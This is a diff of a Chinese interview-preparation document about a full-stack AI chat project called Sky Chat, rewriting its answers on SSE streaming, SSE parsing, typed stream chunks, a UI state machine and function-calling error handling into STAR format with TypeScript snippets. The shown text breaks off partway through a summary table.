@@ -1,66 +1,56 @@
 # Sky Chat 面试问答
 
-***
+> 回答结构统一采用 STAR 面试法：S（背景）→ T（任务）→ A（方案）→ R（结果）。
+> 代码块用于辅助理解方案细节，面试时根据需要选择性展示。
 
-## SSE 流式传输
+---
 
-### Q14：SSE 和 WebSocket 有什么区别？你这个场景为什么选 SSE 不选 WebSocket？
+## 一句话自我介绍
 
-**回答：**
+面试官好，我叫姜家旺。
 
-SSE（Server-Sent Events）和 WebSocket 都是服务端向客户端推送数据的技术，但有本质区别：
+我在 Sky Chat 这个项目里担任全栈开发，独立负责了从架构设计到部署上线的全部工作。这是一个 AI 智能聊天平台，技术栈是 Next.js 16 + TypeScript + PostgreSQL。核心功能包括 SSE 流式对话、联网搜索、图片生成、文件上传、会话管理和分享，还有一套自研的 SSE 性能监控系统和 ECharts 可视化后台。
 
-| 维度       | SSE                    | WebSocket             |
-| -------- | ---------------------- | --------------------- |
-| 通信方向     | 单向（服务端→客户端）            | 双向（全双工）               |
-| 底层协议     | HTTP/1.1 或 HTTP/2      | 独立协议 ws\:// / wss\:// |
-| 断线重连     | 浏览器内置自动重连（EventSource） | 需手动实现                 |
-| 消息格式     | 纯文本，约定 `data:` 前缀      | 文本或二进制帧               |
-| 穿透代理/防火墙 | 天然兼容（走 HTTP）           | 可能被企业防火墙拦截            |
-| 实现复杂度    | 低                      | 高（需处理心跳、重连、粘包）        |
-| 服务端资源    | 长连接，与 HTTP 请求生命周期一致    | 长连接，需独立管理             |
+下面我按模块介绍我做的具体工作。
 
-**选择 SSE 的原因：**
+---
 
-1. **场景匹配**：AI 聊天是典型的"客户端发一次请求，服务端持续推送流式回复"的单向推送场景，不需要客户端频繁向服务端推送数据。
-2. **实现简单**：Next.js API Route 天然支持 `ReadableStream` 返回，不需要额外引入 WebSocket 服务器（如 Socket.IO / ws）。
-3. **部署友好**：服务部署在 Supabase + Vercel 等 Serverless 平台，WebSocket 长连接与 Serverless 的按需启动模型不兼容，SSE 走标准 HTTP 协议，无此问题。
-4. **自动重连**：如果直接使用 EventSource，浏览器会自动重连，无需手动实现。虽然本项目用了自研方案，但 SSE 协议本身具备这个能力。
+## 一、SSE 流式传输
 
-***
+### Q14：SSE 和 WebSocket 有什么区别？为什么选 SSE？
 
-### Q15：原生 EventSource 有什么限制？为什么你要用 Fetch + ReadableStream 自己封装？
+**S（背景）**：AI 聊天的核心体验是流式输出——用户发一条消息，服务端要持续把 AI 的回复一个字一个字推回来。我需要选一种服务端推送技术。
 
-**回答：**
+**T（任务）**：在 SSE 和 WebSocket 之间做技术选型，要求方案既要满足业务需求，又要兼容 Serverless 部署环境。
 
-原生 `EventSource` 有三个核心限制：
+**A（方案）**：我从三个维度做了对比。能力维度——WebSocket 是全双工双向通信，SSE 是服务端到客户端的单向推送。AI 聊天是典型的"客户端发一次、服务端持续回复"的场景，单向完全够用。协议维度——SSE 走标准 HTTP，天然兼容所有代理和防火墙。WebSocket 是独立协议 ws://，企业防火墙可能拦截。部署维度——Next.js API Route 原生支持 ReadableStream 做 SSE，不需要额外引入 Socket.IO。但 WebSocket 长连接跟 Serverless 按需启动的模型不兼容。
 
-1. **只能发 GET 请求**：无法携带 POST Body。而 AI 聊天需要将完整的消息历史、模型参数、搜索开关等作为请求体发送，数据量可能很大，不适合拼在 URL 上。
-2. **无法自定义 HTTP Header**：EventSource 的构造函数不接收 Headers 参数，只能靠浏览器默认行为。但本项目需要在请求中携带认证信息（JWT Cookie），虽然 Cookie 会自动带上，但如果将来需要支持 Bearer Token 等方式就无法实现。
-3. **无法控制请求体/请求方法**：EventSource 不支持 `POST`，也不支持 `Content-Type: application/json`。
+**R（结果）**：SSE 方案在 Serverless 环境下稳定运行，实现代码量远少于 WebSocket，而且保持了标准 HTTP 的部署优势。
 
-因此采用 **Fetch + ReadableStream** 自研方案：
+**追问"那 EventSource 自带重连不是更好吗"**：EventSource 确实自带重连能力，但我没用它。原因是 EventSource 只能发 GET 请求，而 AI 聊天需要 POST 消息历史、模型参数等数据。所以我用 Fetch + ReadableStream 自己封装了 SSE 消费逻辑。重连可以通过业务层实现。
 
-- Fetch 可以发 POST 请求，携带完整的 JSON Body（消息历史、模型、搜索开关等）
-- 通过 `response.body.getReader()` 获取可读流，手动消费 SSE 数据
-- 完全控制请求的构造，包括 AbortController 取消请求
+---
 
-**核心代码（`ChatContainer.tsx`）：**
+### Q15：原生 EventSource 有什么限制？为什么用 Fetch + ReadableStream 自己封装？
+
+**S（背景）**：浏览器有原生的 EventSource API 来消费 SSE 流，用一个 URL 就能自动接收服务端推送。
+
+**T（任务）**：需要把完整的消息历史、模型参数、搜索开关等数据发送给服务端，EventSource 能不能满足？
+
+**A（方案）**：分析后发现三个限制。第一，EventSource 只能发 GET 请求，无法携带 POST Body。AI 聊天的消息历史可能上千 token，不可能拼在 URL 上。第二，不支持自定义 HTTP Header。第三，不支持 Content-Type: application/json。所以改用 Fetch 发送 POST 请求，然后通过 response.body.getReader() 拿到 ReadableStream 手动消费。代价是需要自己处理 TCP 粘包问题——也就是说要自己写一个 SSEParser 来切割消息，这个后面会讲。
+
+**R（结果）**：拿到了对请求的完全控制权——POST Body、自定义参数、AbortController 取消请求。代价是多了约 60 行 SSEParser 代码，但换来的灵活性是值得的。
+
+**核心代码：**
 
 ```typescript
-// 发起 POST 请求，创建 ReadableStream
 const response = await fetch("/api/chat", {
   method: "POST",
   headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    messages: apiMessages,
-    model: currentModel,
-    searchEnabled,
-  }),
-  signal: abortController.signal,  // 支持取消
+  body: JSON.stringify({ messages, model, searchEnabled }),
+  signal: abortController.signal,
 });
 
-// 消费流
 const reader = response.body?.getReader();
 const decoder = new TextDecoder();
 const sseParser = new SSEParser();
@@ -68,1781 +58,468 @@ const sseParser = new SSEParser();
 while (true) {
   const { done, value } = await reader.read();
   if (done) break;
-
-  // value 是 Uint8Array，解码为文本
-  const chunk = decoder.decode(value, { stream: true });
-
-  // 交给 SSE 解析器，切割出完整的 SSE 事件
-  const events = sseParser.parse(chunk);
-
+  const events = sseParser.parse(decoder.decode(value, { stream: true }));
   for (const event of events) {
-    // 将 SSE data 字段解析为类型化 Chunk
-    const streamChunk = parseAIStreamChunk(event.data);
-    // 分发到对应的回调
-    if (streamChunk) handleStreamChunk(streamChunk, callbacks);
+    const chunk = parseAIStreamChunk(event.data);
+    if (chunk) handleStreamChunk(chunk, callbacks);
   }
 }
 ```
 
-***
+---
 
-### Q16：ReadableStream 你是怎么消费的？写一下核心代码的伪代码。
+### Q16：ReadableStream 你怎么消费的？写一下伪代码。
 
-**回答：**
+**S（背景）**：选了 Fetch + ReadableStream 方案后，需要从头实现流的消费链路。原始数据是 Uint8Array 字节块，最终要变成 UI 能消费的结构化 Chunk。
 
-消费 ReadableStream 的核心流程分为三层：**Reader 层 → SSE Parser 层 → Chunk Dispatcher 层**。
+**T（任务）**：设计一个清晰的消费架构，把字节流逐层转换，每层只做一件事。
 
-**伪代码：**
+**A（方案）**：设计了三层。第一层 Reader 层——用 fetch 发 POST 请求，拿到 reader，循环 await reader.read() 获取字节块。第二层 SSEParser 层——把字节解码为文本，按 SSE 协议的 \n\n 分隔符切出完整事件。第三层 Chunk Dispatcher 层——把事件的 data 字段做 JSON.parse，校验 type 字段，按类型分发到 14 个回调函数。三层之间的数据格式依次是 Uint8Array → 文本 → SSEEvent → StreamChunk → callback 参数。
 
-```
-// ========== 第 1 层：Reader 层 ==========
-abortController = new AbortController()
+用户点停止时，调用 abortController.abort() 终止 fetch，forceFlush 清空渲染缓冲区，重置状态机。
 
-response = fetch("/api/chat", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ messages: [...], model: "gpt-4", searchEnabled: true }),
-  signal: abortController.signal
-})
+**R（结果）**：三层架构各司其职，每层只有一种数据转换职责。任何一层出问题都隔离在层内，不会污染其他层。
 
-reader = response.body.getReader()
-decoder = new TextDecoder()
-sseParser = new SSEParser()
+**代码参考 Q15，此处省略。**
 
-// ========== 第 2 层：SSE Parser 层 ==========
-while true:
-  { done, value } = await reader.read()
-  if done: break
+---
 
-  // Uint8Array → 文本（stream: true 保证不截断多字节字符）
-  text = decoder.decode(value, { stream: true })
+### Q17：类型化 Chunk 协议——数据结构是什么？怎么区分不同类型？
 
-  // SSE Parser 从文本流中切割出事件块
-  // 分割规则：以 \n\n 为事件分隔符
-  events = sseParser.parse(text)
+**S（背景）**：OpenAI API 返回的原始 SSE 格式跟供应商绑定。如果客户端直接解析原始格式，换 API 供应商时客户端要大改。
 
-  // ========== 第 3 层：Chunk Dispatcher 层 ==========
-  for event in events:
-    chunk = parseAIStreamChunk(event.data)  // JSON.parse → 类型检查
-    if chunk:
-      handleStreamChunk(chunk, {
-        onTextDelta: (id, delta) => buffer.push(delta),
-        onToolInputStart: (id, name) => addToolPart(...),
-        onFinish: () => { buffer.forceFlush(); finalizeCurrentMessage(); },
-        onError: (err) => setError(err),
-        // ... 共 14 个回调
-      })
+**T（任务）**：设计一套中间协议，把上游 API 的原始响应统一翻译为前端可消费的类型化事件，实现前后端解耦。
 
-// ========== 用户点击停止 ==========
-handleStop():
-  abortController.abort()     // 终止 fetch
-  buffer.forceFlush()         // 清空缓冲区
-  finalizeCurrentMessage()    // 标记消息完成
-  reset()                     // 状态机 → idle
-```
+**A（方案）**：定义了 15 种 chunk 类型，用 type 字段区分。服务端发的每个 SSE 事件的 data 都是一个 JSON：`{"type":"text-delta","id":"text-1","delta":"你好"}`。文本类 3 种（start/delta/end），推理类 3 种，工具调用类 5 种（start/delta/available/output-available/output-error），再加 step-start、finish、error、abort 四种生命周期事件。客户端通过 switch-case 按 type 分发到不同回调，每个回调的参数签名由 TypeScript 类型系统保证。
 
-**实际代码（`ChatContainer.tsx:288-327`）：**
+**R（结果）**：客户端永远不解析 OpenAI 的原始响应。以后换 API 供应商只改服务端，客户端零改动。TypeScript 的类型安全保证不会出现回调参数不匹配。
+
+**核心代码：**
 
 ```typescript
-try {
-  const response = await fetch("/api/chat", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ messages: apiMessages, model: currentModel, searchEnabled }),
-    signal: abortController.signal,
-  });
-
-  if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
-
-  const reader = response.body?.getReader();
-  const decoder = new TextDecoder();
-  const sseParser = new SSEParser();
-
-  if (reader) {
-    while (true) {
-      const { done, value } = await reader.read();
-      if (done) break;
-      const chunk = decoder.decode(value, { stream: true });
-      const events = sseParser.parse(chunk);
-      for (const event of events) {
-        const streamChunk = parseAIStreamChunk(event.data);
-        if (streamChunk) handleStreamChunk(streamChunk, callbacks);
-      }
-    }
-  }
-} catch (error) {
-  if (error instanceof DOMException && error.name === 'AbortError') return;
-  buffer.forceFlush();
-  finalizeCurrentMessage();
-  setError('网络错误，请重试');
-}
-```
-
-***
-
-### Q17：你说设计了"类型化 Chunk 协议"，Chunk 的数据结构是什么样的？怎么区分文本 chunk、推理 chunk 和工具调用 chunk？
-
-**回答：**
-
-服务端发出的每个 SSE 事件都包含一个 JSON 对象，通过 `type` 字段区分 chunk 类型。共定义了 **15 种 chunk 类型**，覆盖 AI 回复的完整生命周期。
-
-**Chunk 数据结构（`lib/ai-stream.ts`）：**
-
-```typescript
-// 15 种 Chunk 类型
 export type StreamChunkType =
-  | 'text-start'      // 文本开始（携带 id）
-  | 'text-delta'      // 文本增量（流式输出时每次一小段）
-  | 'text-end'        // 文本结束
-  | 'reasoning-start' | 'reasoning-delta' | 'reasoning-end'  // 推理过程（思考模式）
-  | 'tool-input-start'    // 工具调用开始（含 toolCallId + toolName）
-  | 'tool-input-delta'    // 工具参数增量（流式接收）
-  | 'tool-input-available' // 工具参数接收完毕（含完整 input）
-  | 'tool-output-available' // 工具执行结果
-  | 'tool-output-error'     // 工具执行失败
-  | 'step-start'        // 多轮 Function Calling 的步骤分隔
-  | 'finish'            // 流正常结束
-  | 'error'             // 异常
-  | 'abort';            // 用户中止
+  | 'text-start' | 'text-delta' | 'text-end'
+  | 'reasoning-start' | 'reasoning-delta' | 'reasoning-end'
+  | 'tool-input-start' | 'tool-input-delta' | 'tool-input-available'
+  | 'tool-output-available' | 'tool-output-error'
+  | 'step-start' | 'finish' | 'error' | 'abort';
 
-export interface StreamChunk {
-  type: StreamChunkType;
-  [key: string]: unknown;  // 携带 type 相关的额外字段
-}
-```
-
-**如何区分三种主要 chunk：**
-
-| 类型         | type 值                                                                                     | 特有字段                                         | 含义                    |
-| ---------- | ------------------------------------------------------------------------------------------ | -------------------------------------------- | --------------------- |
-| 文本 Chunk   | `text-start` / `text-delta` / `text-end`                                                   | `id`, `delta`                                | 携带流式输出的文本增量           |
-| 推理 Chunk   | `reasoning-start` / `reasoning-delta` / `reasoning-end`                                    | `id`, `delta`                                | 模型的思考过程（如 o1 系列的内部推理） |
-| 工具调用 Chunk | `tool-input-start` / `tool-input-delta` / `tool-input-available` / `tool-output-available` | `toolCallId`, `toolName`, `input` / `output` | Function Calling 全过程  |
-
-**分发核心代码（`lib/ai-stream.ts`）：**
-
-```typescript
 export function handleStreamChunk(chunk: StreamChunk, callbacks: StreamCallbacks) {
   switch (chunk.type) {
-    case 'text-start':
-      callbacks.onTextStart?.(chunk.id as string);
-      break;
     case 'text-delta':
       callbacks.onTextDelta?.(chunk.id as string, chunk.delta as string);
-      break;
-    case 'text-end':
-      callbacks.onTextEnd?.(chunk.id as string);
-      break;
-    case 'reasoning-start':
-      callbacks.onReasoningStart?.(chunk.id as string);
-      break;
-    case 'reasoning-delta':
-      callbacks.onReasoningDelta?.(chunk.id as string, chunk.delta as string);
-      break;
-    case 'reasoning-end':
-      callbacks.onReasoningEnd?.(chunk.id as string);
       break;
     case 'tool-input-start':
       callbacks.onToolInputStart?.(chunk.toolCallId as string, chunk.toolName as string);
       break;
-    case 'tool-input-delta':
-      callbacks.onToolInputDelta?.(chunk.toolCallId as string, chunk.delta as string);
-      break;
-    case 'tool-input-available':
-      callbacks.onToolInputAvailable?.(chunk.toolCallId as string, chunk.toolName as string, chunk.input);
-      break;
-    case 'tool-output-available':
-      callbacks.onToolOutputAvailable?.(chunk.toolCallId as string, chunk.output);
-      break;
-    case 'tool-output-error':
-      callbacks.onToolOutputError?.(chunk.toolCallId as string, chunk.errorText as string);
-      break;
-    case 'step-start':
-      callbacks.onStepStart?.();
-      break;
     case 'finish':
       callbacks.onFinish?.(chunk.finishReason as string);
       break;
-    case 'error':
-      callbacks.onError?.(chunk.errorText as string);
-      break;
-    case 'abort':
-      callbacks.onAbort?.(chunk.reason as string);
-      break;
+    // ... 共 15 个 case
   }
 }
 ```
 
-**设计动机**：客户端永远不直接解析 OpenAI 的原始 SSE 响应，服务端统一翻译为类型化 Chunk。好处是：
+**追问"为什么工具输入要分 start/delta/available 三个类型"**：因为工具调用的参数是流式到达的，不是一次性给全。start 让 UI 立刻弹工具卡片，delta 让参数逐步显示，available 表示参数收完可以执行了。如果只用一个类型，UI 就得等参数收完才知道有工具调用，出现几百毫秒的空白。
 
-- 换 API 供应商时只改服务端，客户端零改动
-- TypeScript 类型安全
-- 每种 chunk 只携带必要字段，带宽更省
+---
 
-***
+### Q18：怎么把收到的 SSE 文本解析成结构化 Chunk？分割规则是什么？
 
-### Q18：流式数据到了浏览器端，你怎么把收到的 SSE 文本解析成结构化的 Chunk？分割规则是什么？
+**S（背景）**：TCP 是字节流，不保证消息边界。一次 reader.read() 可能返回 0.5 条、1 条或 2.3 条 SSE 消息——这就是粘包和半包问题。
 
-**回答：**
+**T（任务）**：需要一个解析器，能从连续的字节流中准确切出每一条完整的 SSE 事件。
 
-SSE 原始文本流经过两层解析：
+**A（方案）**：我写了一个 SSEParser 类，核心逻辑是维护一个内部 buffer 字符串。每次收到新数据追加到 buffer，然后在 buffer 里找 \n\n——这是 SSE 协议规定的事件分隔符。找到一组完整的事件块就切出来，解析 data 字段，末尾不完整的留在 buffer 等下次拼接。两层保护：SSE 协议层用 \n\n 保证不拿到半条消息，JSON 解析层用 try-catch 保证畸形数据不崩溃。
 
-**第一层：SSE 协议解析（`SSEParser`）**
+**R（结果）**：无论 TCP 怎么切分字节流，SSEParser 都能还原出服务端发的一条条完整事件。
 
-SSE 协议规定事件之间以 **`\n\n`（双换行）** 分隔。`SSEParser` 维护一个内部 buffer，每次收到新数据追加到 buffer，然后以 `\n\n` 为分隔符切割出完整事件块。
-
-**核心代码（`lib/sse-parser.ts`）：**
+**核心代码：**
 
 ```typescript
 export class SSEParser {
   private buffer = '';
 
   parse(chunk: string): SSEEvent[] {
-    // 1. 拼接到内部 buffer
     this.buffer += chunk;
     const events: SSEEvent[] = [];
-
-    // 2. 以 \n\n 为分隔符，切割出完整的事件块
     let pos: number;
     while ((pos = this.buffer.indexOf('\n\n')) !== -1) {
-      // 取出一个完整事件块
       const raw = this.buffer.slice(0, pos);
-      // 剩余部分留在 buffer，等待后续数据
       this.buffer = this.buffer.slice(pos + 2);
-
-      // 3. 解析单个事件块
       const event = this.parseBlock(raw);
       if (event) events.push(event);
     }
-
     return events;
   }
-
-  private parseBlock(block: string): SSEEvent | null {
-    // 按行解析字段
-    // event: xxx  → 事件类型
-    // data: yyy   → 数据（多行 data 会被拼接，用 \n 连接）
-    // id: zzz     → 事件 ID（用于断线重连）
-    // retry: nnn  → 重连间隔
-    const lines = block.split('\n');
-    let event: string | undefined;
-    let data = '';
-    // ... 逐行解析
-
-    // 没有 data 字段的事件块直接丢弃
-    if (!data) return null;
-
-    return { event, data, id, retry };
-  }
 }
 ```
 
-**分割规则总结：**
+---
 
-| 规则         | 说明                                    |
-| ---------- | ------------------------------------- |
-| 事件分隔符      | `\n\n`（双换行）                           |
-| 字段分隔符      | `\n`（单换行）                             |
-| 多行 data 拼接 | 多行 `data:` 字段合并为一个 data，用 `\n` 连接     |
-| 不完整保留      | 末尾不完整的部分留在 buffer 中，等待下次 `parse()` 调用 |
-| 空 data 丢弃  | `data` 为空的事件块忽略                       |
+## 二、有限状态机
 
-**第二层：JSON 解析 + 类型校验（`parseAIStreamChunk`）**
+### Q19：状态机有几个状态？转换规则是什么？
 
-SSE 解析出一行 `data:` 后，解析为 JSON，校验是否有合法 `type` 字段：
+**S（背景）**：AI 回复有多个阶段——等待响应、模型思考、工具调用、正文输出、完成或出错。不同阶段 UI 需要展示不同的指示器。
 
-```typescript
-export function parseAIStreamChunk(data: string): StreamChunk | null {
-  try {
-    const parsed = JSON.parse(data);
-    if (parsed && typeof parsed === 'object' && typeof parsed.type === 'string') {
-      return parsed as StreamChunk;
-    }
-    return null;
-  } catch {
-    return null;
-  }
-}
-```
+**T（任务）**：设计一套状态管理机制，让 UI 始终知道"现在应该显示什么"，并且状态转换逻辑集中可控。
 
-**完整数据流：**
+**A（方案）**：定义了五个状态：idle（空闲）、thinking（等待首字节）、tool_calling（模型在调工具）、answering（正在输出文字）、error（异常）。转换规则很直接——用户发消息 → idle 变 thinking。收到第一个 text-delta → thinking 变 answering。中间收到 tool-input-start → 变 tool_calling。工具执行完 → 回 answering。收到 finish → 回 idle。任何阶段出错 → error。状态存在 Zustand store 里，所有 setStatus 调用集中在 SSE chunk 回调这一处。UI 层只读 status 一个值做渲染决策——组件不需要知道状态是怎么变的。
 
-```
-网络字节流 (Uint8Array)
-  → TextDecoder.decode(stream:true) → 文本
-    → SSEParser.parse() → SSEEvent[] (以 \n\n 切割)
-      → JSON.parse(event.data) → JSON
-        → parseAIStreamChunk() → StreamChunk | null
-          → handleStreamChunk() → 14 个回调之一
-```
+**R（结果）**：调试时只需要追踪 status 的变化日志就能复现问题。多轮 Function Calling 场景下 UI 跟 SSE 实际状态严格同步，不会出现"提示正在输入但没字出来"的问题。
 
-***
-
-## 有限状态机
-
-### Q19：你说用有限状态机管理消息生命周期，具体有几个状态？状态之间的转换规则是什么？
-
-**回答：**
-
-状态机定义了 **5 个状态**，用于追踪每次 AI 回复所处的生命周期阶段：
+**核心代码：**
 
 ```typescript
 export type ChatStatus = 'idle' | 'thinking' | 'tool_calling' | 'answering' | 'error';
-```
 
-**状态转换图：**
-
-```
-                    ┌─────────────────────────────────┐
-                    │                                   │
-                    ▼                                   │
-  ┌──────────┐  用户发送消息   ┌───────────┐ 推理完成   │
-  │          │──────────────▶│           │──────────┐  │
-  │   idle   │               │ thinking  │          │  │
-  │          │◀──────────────│           │          │  │
-  └──────────┘  流结束/中止   └───────────┘          │  │
-       ▲          /出错                                │  │
-       │                    ┌──────────────────────────┘  │
-       │                    │ 开始输出文本                 │
-       │                    ▼                             │
-       │               ┌───────────┐  检测到 tool_call    │
-       │               │           │──────────────────┐  │
-       │               │ answering │                   │  │
-       │               │           │◀──────────────┐   │  │
-       │               └───────────┘  工具执行完毕  │   │  │
-       │                    │   /出错               │   │  │
-       │                    │                       │   │  │
-       │                    │                       ▼   │  │
-       │                    │               ┌──────────────┐
-       │                    │               │              │
-       │                    │               │ tool_calling │
-       │                    │               │              │
-       │                    │               └──────────────┘
-       │                    │
-       │                    ▼
-       │               ┌───────────┐
-       └───────────────│           │
-                       │   error   │
-                       │           │
-                       └───────────┘
-```
-
-**转换规则：**
-
-| 触发事件                     | 原状态                  | 新状态           | 说明                    |
-| ------------------------ | -------------------- | ------------- | --------------------- |
-| 用户发送消息                   | idle                 | thinking      | 开始等待服务端响应             |
-| 服务端开始推送 `text-delta`     | thinking             | answering     | LLM 开始输出正文            |
-| 服务端推送 `tool-input-start` | thinking / answering | tool\_calling | 模型触发 Function Calling |
-| 工具执行完毕，`text-end` 后继续输出  | tool\_calling        | answering     | 工具结果返回，模型继续回答         |
-| 流正常结束（`finish`）          | any                  | idle          | 回复完成                  |
-| 用户点击停止（`abort`）          | any                  | idle          | 主动终止                  |
-| 发生错误（`onError`）          | any                  | error         | 网络异常、API 错误等          |
-
-**代码实现：**
-
-在 `ChatContainer.tsx` 的流回调中驱动状态转换：
-
-```typescript
-const callbacks: StreamCallbacks = {
-  // 开始输出文本 → 进入 answering
-  onTextStart: () => { setStatus('answering'); },
-
-  // 检测到工具调用 → 进入 tool_calling
-  onToolInputStart: (toolCallId, toolName) => {
-    setStatus('tool_calling');
-    // ...
-  },
-
-  // 工具执行完毕 → 回到 answering
-  onToolOutputAvailable: (toolCallId, output) => {
-    updateToolOutput(toolCallId, output);
-    setStatus('answering');
-  },
-
-  onToolOutputError: (toolCallId, errorText) => {
-    updateToolError(toolCallId, errorText);
-    setStatus('answering');
-  },
-
-  // 流结束 → 回到 idle
-  onFinish: () => {
-    finalizeCurrentMessage();
-    setStatus('idle');
-  },
-
-  // 错误 → error
-  onError: (errorText) => {
-    finalizeCurrentMessage();
-    setError(errorText);  // setError 内部 setStatus('error')
-  },
-
-  // 中止 → idle
-  onAbort: () => {
-    finalizeCurrentMessage();
-    reset();  // reset() 内部 setStatus('idle')
-  },
+// 所有状态转换集中在一处（ChatContainer 的 SSE callbacks）
+const callbacks = {
+  onTextStart: () => setStatus('answering'),
+  onToolInputStart: () => setStatus('tool_calling'),
+  onToolOutputAvailable: () => setStatus('answering'),
+  onFinish: () => setStatus('idle'),
+  onError: (err) => setError(err),
 };
+
+// UI 只读不写
+{status === 'thinking' && <ThinkingSkeleton />}
+{status === 'tool_calling' && <ToolCard />}
+<ChatInput disabled={status !== 'idle'} />
 ```
 
-**UI 层根据状态渲染不同内容：**
+---
 
-- `idle`：显示输入框，可发送消息
-- `thinking`：显示 "正在思考..." 的骨架屏动画
-- `tool_calling`：显示 "正在搜索..." 或 "正在生成图片..."
-- `answering`：流式输出文本，显示光标闪烁
-- `error`：显示错误提示
+### Q20：多轮 Function Calling 时状态不同步，遇到了什么问题？怎么解决的？
 
-***
+**S（背景）**：实现联网搜索功能时，一轮对话触发两轮 LLM 调用。第一轮模型决定调搜索工具，服务端执行搜索。第二轮模型基于搜索结果输出最终答案。
 
-### Q20：多轮 Function Calling 时，UI 显示的状态和实际 SSE 推过来的状态不同步，你具体遇到了什么问题？状态机怎么解决的？
+**T（任务）**：两轮之间有个空窗期——工具执行完了但第二轮还没返回首字节——UI 显示什么？
 
-**回答：**
+**A（方案）**：问题在于我一开始在工具执行完后立即把状态从 tool_calling 切成了 answering。用户看到"正在输入..."动画但几百毫秒没字出来，以为卡了。根本原因是状态切换被我自己的"预期"驱动了——我以为下一轮马上会输出——而不是被"事实"驱动。解决方案很简单：工具执行完不切状态，保持 tool_calling。只有第二轮的第一个 text-delta 真正到达时才切 answering。核心原则就是状态切换由数据驱动，不由预期驱动。
 
-**问题场景：**
+**R（结果）**：多轮场景下用户在工具执行完到下一轮输出之间看到的是"搜索中"，而不是空白的"输入中"，不再困惑。
 
-在实现多轮 Function Calling（如联网搜索）时，每一轮的流程是：
+---
 
-```
-第 1 轮：thinking → 模型决定调用 webSearch → tool_calling → 执行搜索 → 搜索结果返回
-第 2 轮：模型根据搜索结果续写 → answering → 流式输出最终答案
-```
+### Q21：Function Calling 返回错误怎么处理？
 
-遇到的问题：第 1 轮工具执行完毕后，服务端发出 `step-start`（表示进入下一轮），但模型还没开始输出文本。此时如果 UI 的 `tool_calling` → `answering` 转换提前发生，用户会看到 "正在输入..." 但几秒内都没有文字出现，体验割裂。
+**S（背景）**：Function Calling 涉及外部网络请求——图片生成 API、搜索引擎——可能因为超时、Key 无效、服务宕机等失败。
 
-**根本原因：** 服务端在工具执行完毕后立即发出下一轮请求，但从发出请求到收到首字节有网络延迟（TTFB）。在这个空窗期，客户端不知道是应该显示 "正在思考" 还是 "正在回答"。
+**T（任务）**：需要一套完整的异常兜底机制，确保任何异常都不会导致 UI 崩溃或流程卡死。
 
-**状态机解决方案：**
+**A（方案）**：设计了三层兜底。第一层工具层——服务端执行工具失败时 emit tool-output-error，错误信息注回对话让模型知道失败了。第二层状态机层——客户端收到错误后切回 answering，不中断流程，模型会尝试修正。第三层全局兜底——服务端外层 try-catch 捕获所有未预期异常 emit error 关闭流，客户端的 catch 中 forceFlush 把已收到内容先展示再提示错误。另外设置了 MAX_STEPS=5 硬限制防止死循环。
 
-1. 工具执行完毕后立即切回 `thinking`，而不是 `answering`
-2. 只有收到第一个 `text-delta` 时才进入 `answering`
-3. 用 `step-start` chunk 作为轮次分隔符，保证同一轮的工具调用和文本输出归属到同一条消息
+**R（结果）**：任何异常用户都能看到已输出的内容 + 错误提示，不会白屏或丢失数据。关键是精确区分了"用户主动停止"（AbortError）和"真的网络错误"——两类异常处理逻辑不同，不能混。
+
+**核心代码：**
 
 ```typescript
-// 状态转换逻辑（关键代码）
-onTextStart: () => {
-  setStatus('answering');    // 只有真正开始输出文本才进 answering
-},
-
-onToolInputStart: (toolCallId, toolName) => {
-  setStatus('tool_calling'); // 触发工具调用
-},
-
-onToolOutputAvailable: (toolCallId, output) => {
-  updateToolOutput(toolCallId, output);
-  // 注意：这里不切状态，等 step-start 后收到 text-delta 再切
-},
-
-onToolOutputError: (toolCallId, errorText) => {
-  updateToolError(toolCallId, errorText);
-  // 同样不切状态
-},
-
-onStepStart: () => {
-  // 新一轮开始，状态继承（由后续 onTextStart 驱动切换）
-  buffer.forceFlush();  // 但不清状态
-},
-```
-
-**效果：** 多轮 Function Calling 场景下，UI 始终与 SSE 实际状态同步。用户在工具执行完毕到下一轮文本出现之间看到的是 `tool_calling` 状态（"正在搜索互联网..."），而不是空白的 "正在输入"。
-
-***
-
-### Q21：如果 Function Calling 返回了错误，状态机怎么处理异常状态？有没有兜底？
-
-**回答：**
-
-异常处理覆盖了三个层面：
-
-**1. 工具执行层面（服务端）**
-
-```typescript
-// 服务端 /api/chat/route.ts
-for (const tc of currentToolCalls.values()) {
-  const output = await executeTool(tc.name, toolInput);
-
-  const hasError = output !== null && typeof output === 'object'
-    && 'error' in (output as Record<string, unknown>);
-
-  if (hasError) {
-    emit("tool-output-error", {
-      toolCallId: tc.id,
-      errorText: (output as { error: string }).error,
-    });
-  } else {
-    emit("tool-output-available", { toolCallId: tc.id, output });
-  }
-}
-```
-
-**2. 状态机层面（客户端）**
-
-```typescript
-// ChatContainer.tsx callbacks
-onToolOutputAvailable: (toolCallId, output) => {
-  updateToolOutput(toolCallId, output);
-  setStatus('answering');  // 正常 → 继续回答
-},
-onToolOutputError: (toolCallId, errorText) => {
-  updateToolError(toolCallId, errorText);
-  setStatus('answering');  // 错误 → 也切回 answering，让模型知道工具失败了
-},
-```
-
-工具失败时，错误信息作为 tool message 返回给模型，模型会重新尝试或向用户说明。状态机切回 `answering` 保证流程不断。
-
-**3. 全局兜底**
-
-```typescript
-// /api/chat/route.ts — 外层 try/catch
-try {
-  // ... 多轮 Function Calling 循环
-} catch (error: unknown) {
-  if (streamCancelled) return;
-  if (error instanceof Error && error.name === "AbortError") return;
-  emit("error", {
-    errorText: error instanceof Error ? error.message : "Unknown error",
-  });
-  controller.close();
+// 服务端：工具执行区分成功/失败
+if (hasError) {
+  emit("tool-output-error", { toolCallId, errorText });
+} else {
+  emit("tool-output-available", { toolCallId, output });
 }
 
-// 客户端 — 流异常的兜底
-// ChatContainer.tsx
-catch (error: unknown) {
+// 客户端：错误不中断流程
+onToolOutputError: (id, err) => { updateToolError(id, err); setStatus('answering'); },
+
+// 全局兜底：区分 AbortError
+catch (error) {
   if (error instanceof DOMException && error.name === 'AbortError') return;
-  buffer.forceFlush();           // 缓冲区清空（已有内容先展示）
-  finalizeCurrentMessage();      // 标记消息完成（保留已有内容）
-  setError('网络错误，请重试');   // 展示错误提示
+  buffer.forceFlush(); finalizeCurrentMessage(); setError('网络错误，请重试');
 }
 ```
 
-**兜底策略总结：**
+---
 
-| 异常层次     | 处理方式                                                | 用户体验                 |
-| -------- | --------------------------------------------------- | -------------------- |
